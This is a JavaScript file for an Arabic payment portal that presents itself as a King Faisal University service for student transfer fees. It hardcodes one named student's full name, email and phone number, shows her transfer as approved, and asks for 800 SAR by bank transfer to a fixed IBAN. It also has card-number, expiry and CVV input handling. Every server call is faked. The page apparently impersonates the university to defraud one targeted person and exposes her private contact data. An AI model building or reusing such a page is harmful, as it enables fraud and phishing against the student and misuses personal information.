// Student data - including the specific student requested
const studentsData = {
    '202511861': {
        id: '202511861',
        name: 'خديجة بنت علي بن منصور ال فتيل',
        email: 'Kadija966.a@gmail.com',
        phone: '0556785316',
        currentMajor: 'علم النفس - قسم أخصائي نفسي',
        requestedMajor: 'قانون',
        status: 'approved',
        applicationDate: '2025-06-05',
        transferFee: 800,
        paymentStatus: 'unpaid'
    }
};

// Global variables
let currentStudent = null;

// Page navigation
function showPage(pageId) {
    // Hide all pages
    const pages = document.querySelectorAll('.page');
    pages.forEach(page => {
        page.classList.remove('active');
    });

    // Show selected page
    const targetPage = document.getElementById(pageId + '-page');
    if (targetPage) {
        targetPage.classList.add('active');
    }

    // Update navigation
    const navButtons = document.querySelectorAll('.nav-btn');
    navButtons.forEach(btn => {
        btn.classList.remove('active');
    });

    // Find and activate the corresponding nav button
    const activeBtn = Array.from(navButtons).find(btn => 
        btn.onclick && btn.onclick.toString().includes(pageId)
    );
    if (activeBtn) {
        activeBtn.classList.add('active');
    }

    // Clear any existing student data when switching pages
    if (pageId !== 'inquiry') {
        const studentDetails = document.getElementById('student-details');
        if (studentDetails) {
            studentDetails.classList.add('hidden');
        }
    }

    if (pageId !== 'payment') {
        const paymentForm = document.getElementById('payment-form');
        if (paymentForm) {
            paymentForm.classList.add('hidden');
        }
    }
}

// Student search functionality
function searchStudent() {
    const studentId = document.getElementById('studentId').value.trim();
    const errorElement = document.getElementById('inquiry-error');
    const searchBtn = document.getElementById('search-btn');

    // Clear previous errors
    errorElement.classList.add('hidden');
    errorElement.textContent = '';

    if (!studentId) {
        showError('inquiry-error', 'يرجى إدخال الرقم الجامعي');
        return;
    }

    // Show loading state
    searchBtn.innerHTML = '<span class="spinner"></span> جاري البحث...';
    searchBtn.disabled = true;

    // Simulate API call delay
    setTimeout(() => {
        const student = studentsData[studentId];
        
        if (student) {
            currentStudent = student;
            displayStudentDetails(student);
            errorElement.classList.add('hidden');
        } else {
            showError('inquiry-error', 'لم يتم العثور على طالب بهذا الرقم الجامعي أو لا يوجد طلب تحويل');
        }

        // Reset button
        searchBtn.innerHTML = '<span class="btn-icon">🔍</span> بحث';
        searchBtn.disabled = false;
    }, 1500);
}

// Display student details
function displayStudentDetails(student) {
    const detailsContainer = document.getElementById('student-details');
    
    const statusText = getStatusText(student.status);
    const statusClass = getStatusClass(student.status);
    const paymentStatusText = getPaymentStatusText(student.paymentStatus);
    const paymentStatusClass = getPaymentStatusClass(student.paymentStatus);

    detailsContainer.innerHTML = `
        <div class="card-header">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
                <div>
                    <h3 class="card-title">
                        <span class="card-icon">👤</span>
                        معلومات الطالب
                    </h3>
                    <p class="card-description">تفاصيل طلب التحويل الخارجي</p>
                </div>
                <div class="status-badge ${statusClass}">
                    ${statusText}
                </div>
            </div>
        </div>
        <div class="card-content">
            <div style="margin-bottom: 2rem;">
                <h4 style="margin-bottom: 1rem; color: #1e293b;">المعلومات الشخصية</h4>
                <div class="student-info">
                    <div class="info-item">
                        <div class="info-icon">👤</div>
                        <div class="info-content">
                            <div class="info-label">الاسم الكامل</div>
                            <div class="info-value">${student.name}</div>
                        </div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">🆔</div>
                        <div class="info-content">
                            <div class="info-label">الرقم الجامعي</div>
                            <div class="info-value">${student.id}</div>
                        </div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">✉️</div>
                        <div class="info-content">
                            <div class="info-label">البريد الإلكتروني</div>
                            <div class="info-value">${student.email}</div>
                        </div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">📱</div>
                        <div class="info-content">
                            <div class="info-label">رقم الجوال</div>
                            <div class="info-value">${student.phone}</div>
                        </div>
                    </div>
                </div>
            </div>

            <div style="margin-bottom: 2rem;">
                <h4 style="margin-bottom: 1rem; color: #1e293b;">معلومات التحويل</h4>
                <div class="student-info">
                    <div class="info-item">
                        <div class="info-icon">🎓</div>
                        <div class="info-content">
                            <div class="info-label">التخصص الحالي</div>
                            <div class="info-value">${student.currentMajor}</div>
                        </div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">🎯</div>
                        <div class="info-content">
                            <div class="info-label">التخصص المطلوب</div>
                            <div class="info-value" style="color: #005AA7;">${student.requestedMajor}</div>
                        </div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">📅</div>
                        <div class="info-content">
                            <div class="info-label">تاريخ تقديم الطلب</div>
                            <div class="info-value">${formatDate(student.applicationDate)}</div>
                        </div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">💰</div>
                        <div class="info-content">
                            <div class="info-label">رسوم التحويل</div>
                            <div class="info-value">${student.transferFee} ريال سعودي</div>
                        </div>
                    </div>
                </div>
            </div>

            <div style="margin-bottom: 1.5rem;">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                    <h4 style="color: #1e293b; margin: 0;">حالة السداد</h4>
                    <div class="status-badge ${paymentStatusClass}">
                        ${paymentStatusText}
                    </div>
                </div>
                
                ${getStatusMessage(student)}
            </div>
        </div>
    `;

    detailsContainer.classList.remove('hidden');
}

// Payment search functionality
function searchForPayment() {
    const studentId = document.getElementById('paymentStudentId').value.trim();
    const errorElement = document.getElementById('payment-error');
    const searchBtn = document.getElementById('payment-search-btn');

    // Clear previous errors
    errorElement.classList.add('hidden');
    errorElement.textContent = '';

    if (!studentId) {
        showError('payment-error', 'يرجى إدخال الرقم الجامعي');
        return;
    }

    // Show loading state
    searchBtn.innerHTML = '<span class="spinner"></span> جاري البحث...';
    searchBtn.disabled = true;

    // Simulate API call delay
    setTimeout(() => {
        const student = studentsData[studentId];
        
        if (student) {
            currentStudent = student;
            
            if (student.status !== 'approved') {
                showError('payment-error', `يمكن سداد الرسوم فقط للطلبات المقبولة. حالة طلبك الحالية: ${getStatusText(student.status)}`);
            } else if (student.paymentStatus === 'paid') {
                showError('payment-error', ' لم يتم سداد رسوم التحويل  لهذا الطلب ');
            } else {
                displayPaymentForm(student);
                errorElement.classList.add('hidden');
            }
        } else {
            showError('payment-error', 'لم يتم العثور على طالب بهذا الرقم الجامعي أو لا يوجد طلب تحويل');
        }

        // Reset button
        searchBtn.innerHTML = '<span class="btn-icon">🔍</span> بحث';
        searchBtn.disabled = false;
    }, 1500);
}

// Display payment form
function displayPaymentForm(student) {
    const paymentFormContainer = document.getElementById('payment-form');

    paymentFormContainer.innerHTML = `
        <!-- Payment Summary -->
        <div class="card" style="margin-bottom: 1.5rem;">
            <div class="card-header">
                <h3 class="card-title">ملخص الدفع</h3>
            </div>
            <div class="card-content">
                <div class="payment-summary">
                    <div class="summary-row"><span>اسم الطالب:</span><span style="font-weight: 600;">${student.name}</span></div>
                    <div class="summary-row"><span>الرقم الجامعي:</span><span style="font-weight: 600;">${student.id}</span></div>
                    <div class="summary-row"><span>نوع الخدمة:</span><span>رسوم التحويل الخارجي</span></div>
                    <div class="summary-row"><span>التحويل من:</span><span>${student.currentMajor}</span></div>
                    <div class="summary-row"><span>التحويل إلى:</span><span style="color: #005AA7; font-weight: 600;">${student.requestedMajor}</span></div>
                    <div class="summary-row"><span>المبلغ الإجمالي:</span><span style="color: #005AA7;">${student.transferFee} ريال سعودي</span></div>
                </div>
            </div>
        </div>

        <!-- Bank Transfer Payment -->
        <div class="card">
            <div class="card-header">
                <h3 class="card-title">
                    🏦 الدفع عبر التحويل البنكي
                </h3>
                <p class="card-description">يرجى تحويل المبلغ إلى الحساب التالي ورفع الإيصال</p>
            </div>
            <div class="card-content">
                <div class="bank-details" style="margin-bottom: 1rem; font-size: 1rem; line-height: 1.8;">
                    <strong>اسم البنك:</strong> مصرف الراجحي<br>
                    <strong>رقم الآيبان:</strong> SA7880000856608014546763<br>
                </div>

                <form id="bank-transfer-form">
                    <div class="form-group">
                        <label for="receiptFile" class="form-label">رفع إيصال التحويل البنكي</label>
                        <input type="file" id="receiptFile" class="form-input" accept=".jpg,.jpeg,.png,.pdf" required>
                        <small>الملفات المسموحة: JPG، PNG، PDF</small>
                    </div>

                    <div id="upload-error" class="alert alert-error hidden" style="margin-top: 1rem;"></div>

                    <button type="button" class="btn btn-primary btn-full" style="font-size: 1.1rem; padding: 1rem;" onclick="submitBankTransferReceipt(${student.id})">
                        📤 إرسال الإيصال
                    </button>
                </form>
            </div>
        </div>
    `;

    paymentFormContainer.classList.remove('hidden');
}

// معالجة إرسال الإيصال
function submitBankTransferReceipt(studentId) {
    const receiptFileInput = document.getElementById('receiptFile');
    const errorDiv = document.getElementById('upload-error');
    const file = receiptFileInput.files[0];

    if (!file) {
        showError('upload-error', 'يرجى اختيار ملف الإيصال قبل الإرسال');
        return;
    }

    // عرض شاشة التحميل
    showLoadingOverlay('جاري رفع الإيصال...');

    // محاكاة رفع الملف
    setTimeout(() => {
        hideLoadingOverlay();

        // تحديث حالة الدفع
        if (studentsData[studentId]) {
            studentsData[studentId].paymentStatus = 'paid';
        }

        // تحديث تاريخ الدفع
        document.getElementById('payment-date').textContent = new Date().toLocaleDateString('ar-SA');

        // عرض صفحة التأكيد
        showPage('confirmation');
    }, 3000);
}

// Setup payment form input formatting
function setupPaymentFormFormatting() {
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');

    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = value;
        });
    }

    if (expiryDateInput) {
        expiryDateInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });
    }

    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }
}

// Process payment
function processPayment() {
    const form = document.getElementById('payment-form-data');
    const formData = new FormData(form);
    const processBtn = document.getElementById('process-payment-btn');

    // Validate form
    const paymentMethod = document.getElementById('paymentMethod').value;
    const cardNumber = document.getElementById('cardNumber').value;
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;
    const cardholderName = document.getElementById('cardholderName').value;

    if (!paymentMethod || !cardNumber || !expiryDate || !cvv || !cardholderName) {
        showError('payment-error', 'يرجى تعبئة جميع الحقول المطلوبة');
        return;
    }

    // Show loading overlay
    showLoadingOverlay('جاري معالجة الدفع...');
    
    // Disable button
    processBtn.disabled = true;
    processBtn.innerHTML = '<span class="spinner"></span> جاري معالجة الدفع...';

    // Simulate payment processing
    setTimeout(() => {
        // Update payment status
        if (currentStudent) {
            studentsData[currentStudent.id].paymentStatus = 'paid';
        }

        hideLoadingOverlay();
        
        // Set payment date for confirmation page
        document.getElementById('payment-date').textContent = new Date().toLocaleDateString('ar-SA');
        
        // Show confirmation page
        showPage('confirmation');
    }, 3000);
}

// Utility functions
function getStatusText(status) {
    const statusMap = {
        'approved': 'مقبول',
        'pending': 'قيد المراجعة',
        'rejected': 'مرفوض'
    };
    return statusMap[status] || 'غير محدد';
}

function getStatusClass(status) {
    const classMap = {
        'approved': 'status-approved',
        'pending': 'status-pending',
        'rejected': 'status-rejected'
    };
    return classMap[status] || 'status-pending';
}

function getPaymentStatusText(status) {
    const statusMap = {
        'paid': 'مدفوع',
        'processing': 'قيد المعالجة',
        'unpaid': 'غير مدفوع'
    };
    return statusMap[status] || 'غير محدد';
}

function getPaymentStatusClass(status) {
    const classMap = {
        'paid': 'status-paid',
        'processing': 'status-pending',
        'unpaid': 'status-unpaid'
    };
    return classMap[status] || 'status-unpaid';
}

function getStatusMessage(student) {
    if (student.status === 'approved' && student.paymentStatus === 'unpaid') {
        return `
            <div class="alert alert-warning">
                <span style="font-size: 1.2rem;">⚠️</span>
                <div>
                    تم قبول طلب التحويل الخاص بك! يرجى سداد رسوم التحويل لإتمام العملية.
                    <button class="btn btn-primary" style="margin-top: 0.5rem;" onclick="showPage('payment')">
                        <span class="btn-icon">💳</span>
                        سداد الرسوم الآن
                    </button>
                </div>
            </div>
        `;
    } else if (student.status === 'approved' && student.paymentStatus === 'paid') {
        return `
            <div class="alert alert-success">
                <span style="font-size: 1.2rem;">✅</span>
                <div>
                    تم إتمام عملية التحويل بنجاح! تم قبول طلبك وسداد الرسوم. 
                    ستتلقى تأكيداً رسمياً من عمادة القبول والتسجيل قريباً.
                </div>
            </div>
        `;
    } else if (student.status === 'pending') {
        return `
            <div class="alert alert-info">
                <span style="font-size: 1.2rem;">ℹ️</span>
                <div>
                    طلبك قيد المراجعة من قبل الجهات المختصة. سنقوم بإشعارك بالنتيجة قريباً.
                </div>
            </div>
        `;
    } else if (student.status === 'rejected') {
        return `
            <div class="alert alert-error">
                <span style="font-size: 1.2rem;">❌</span>
                <div>
                    نأسف، لم يتم قبول طلب التحويل. يرجى مراجعة مكتب القبول والتسجيل للحصول على مزيد من المعلومات.
                </div>
            </div>
        `;
    }
    return '';
}

function formatDate(dateString) {
    const date = new Date(dateString);
    return date.toLocaleDateString('ar-SA');
}

function showError(elementId, message) {
    const errorElement = document.getElementById(elementId);
    if (errorElement) {
        errorElement.textContent = message;
        errorElement.classList.remove('hidden');
    }
}

function showLoadingOverlay(message = 'جاري المعالجة...') {
    const overlay = document.getElementById('loading-overlay');
    const loadingText = document.querySelector('.loading-text');
    if (overlay && loadingText) {
        loadingText.textContent = message;
        overlay.classList.remove('hidden');
    }
}

function hideLoadingOverlay() {
    const overlay = document.getElementById('loading-overlay');
    if (overlay) {
        overlay.classList.add('hidden');
    }
}

function downloadReceipt() {
    // Create a simple receipt content
    const receiptContent = `
إيصال دفع رسوم التحويل الخارجي
جامعة الملك فيصل

رقم العملية: TXN-2024-001
اسم الطالب: ${currentStudent ? currentStudent.name : 'خديجة بنت علي بن منصور ال فتيل'}
الرقم الجامعي: ${currentStudent ? currentStudent.id : '202407372'}
المبلغ: 800 ريال سعودي
تاريخ الدفع: ${new Date().toLocaleDateString('ar-SA')}
حالة الدفع: قيد المراجعة

شكراً لكم لاستخدام النظام الإلكتروني
    `;

    // Create and download the receipt
    const blob = new Blob([receiptContent], { type: 'text/plain;charset=utf-8' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'receipt-transfer-fee.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
}

// Event listeners for Enter key
document.addEventListener('DOMContentLoaded', function() {
    // Set current date for confirmation page
    const paymentDateElement = document.getElementById('payment-date');
    if (paymentDateElement) {
        paymentDateElement.textContent = new Date().toLocaleDateString('ar-SA');
    }

    // Add Enter key listeners
    const studentIdInput = document.getElementById('studentId');
    if (studentIdInput) {
        studentIdInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                searchStudent();
            }
        });
    }

    const paymentStudentIdInput = document.getElementById('paymentStudentId');
    if (paymentStudentIdInput) {
        paymentStudentIdInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                searchForPayment();
            }
        });
    }
});

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    // Show home page by default
    showPage('home');
});